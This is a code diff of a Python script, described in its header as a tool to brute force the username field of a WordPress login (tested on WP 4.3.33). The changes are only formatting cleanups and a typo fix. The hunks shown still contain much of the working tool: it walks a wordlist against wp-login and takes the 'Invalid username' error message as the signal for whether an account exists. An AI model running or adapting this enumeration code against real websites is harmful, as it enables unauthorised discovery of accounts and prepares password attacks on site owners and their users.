@@ -2,7 +2,7 @@
 
 # ----------------------------------------------------------------------
 # Copyright (c) 2024 QAEZZ A/K/A Reinitialize
-# 
+#
 # Simple script to brute force the username field of a WordPress login.
 # Tested on WP 4.3.33.
 # ----------------------------------------------------------------------
@@ -41,7 +41,7 @@ def get_args() -> tuple[str, str, int]:
         help="Timeout of each request, default: 5.",
         required=False,
         default=5,
-        type=int
+        type=int,
     )
 
     args = parser.parse_args()
@@ -57,12 +57,11 @@ def check_if_site_up(site: str, timeout: int) -> tuple[bool, str]:
         resp = requests.get(site, timeout=float(timeout))
         if resp.ok:
             return (True, "Site is up.")
-        else:
-            return (False, f"Error: {resp.status_code}")
+        return (False, f"Error: {resp.status_code}")
     except requests.exceptions.Timeout:
         return (False, "Connection timed out.")
     except requests.exceptions.ConnectionError:
-        return (False, "Failed to conned to the site.")
+        return (False, "Failed to connect to the site.")
     except requests.exceptions.RequestException as ex:
         return (False, f"Something went wrong!\n{str(ex)}")
     except ValueError:
@@ -105,29 +104,31 @@ def brute_force(wp_login_url, wp_admin_url, wordlist, s, cookies) -> tuple[bool,
                         "The requests' library has blocked the cookies, WP will not work."
                     )
                     return
-                
+
                 elif "Invalid username" in str(login_error):
-                    current_line = f"({idx:0{len(str(len(lines)))}}/{len(lines)}) Checked {line}"
+                    current_line = (
+                        f"({idx:0{len(str(len(lines)))}}/{len(lines)}) Checked {line}"
+                    )
                     padded_line = current_line.ljust(max_line_length)
                     stdout.write(f"\r{padded_line}")
-                    stdout.flush()  
-                    
+                    stdout.flush()
+
                 else:
                     valid_username = line
                     break
-                    
+
             max_line_length = max(max_line_length, len(current_line))
-        
+
         # Move cursor up one line
-        stdout.write('\x1b[1A')
+        stdout.write("\x1b[1A")
         # Clear the line
-        stdout.write('\x1b[2K')
+        stdout.write("\x1b[2K")
         # Move cursor to beginning of line
-        stdout.write('\r')
+        stdout.write("\r")
         # Clear to the end of the line
-        stdout.write('\x1b[0K')
+        stdout.write("\x1b[0K")
         stdout.flush()
-        
+
         if valid_username:
             return (True, valid_username)
         return (False, "")
@@ -154,7 +155,11 @@ def main() -> None:
     cookies = dict(s.get(wp_login_url).cookies)
 
     result = brute_force(wp_login_url, wp_admin_url, wordlist, s, cookies)
-    print(f"Username -> {result[1]}" if result[0] else "None of the usernames worked, sorry.")
+    print(
+        f"Username -> {result[1]}"
+        if result[0]
+        else "None of the usernames worked, sorry."
+    )
 
 
 if __name__ == "__main__":
